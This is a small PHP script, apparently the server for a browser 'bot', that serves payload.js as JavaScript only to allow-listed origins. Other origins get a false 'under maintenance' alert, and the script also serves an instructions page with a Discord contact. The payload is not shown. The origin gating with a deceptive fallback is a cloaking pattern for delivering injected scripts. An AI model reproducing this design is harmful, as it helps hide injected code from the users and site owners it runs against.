<?php
    require("config.php");
    header("Access-Control-Allow-Origin: *");

    // respond with payload code if 'p' GET parameter is present and origin header matchess
    if (isset($_GET["p"])) {
        header("Content-Type: application/javascript");

        if (isset($_SERVER['HTTP_ORIGIN']) && in_array($_SERVER["HTTP_ORIGIN"], $allowed_origins)) {
            echo file_get_contents("payload.js");
        } else {
            echo "alert('Bot is under maintenance. Temporarily unavailable.')";
        }

        die();
    }
    
    // respond with instructions page
    echo str_replace("{discordContact}", $discord_contact, file_get_contents("./page.html"));
?>